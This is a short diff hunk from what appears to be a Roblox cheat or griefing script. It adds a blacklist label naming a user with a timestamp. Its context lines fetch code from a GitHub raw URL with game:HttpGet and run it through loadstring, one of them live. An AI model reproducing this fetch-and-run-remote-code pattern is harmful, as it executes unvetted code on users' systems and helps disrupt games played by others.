@@ -11760,7 +11760,7 @@ lagTab:CreateInput({
         LineLagV = Value
     end
 })
-
+BlacklistTab:CreateLabel("블랙리스트:kvzwx9  6월 27일 오후7시 39분 42초", 78390276296494, Color3.fromRGB(255, 255, 255), false)
 ---loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/q1"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/qwer123476/12345/main/paca bot"))()
 Logger()
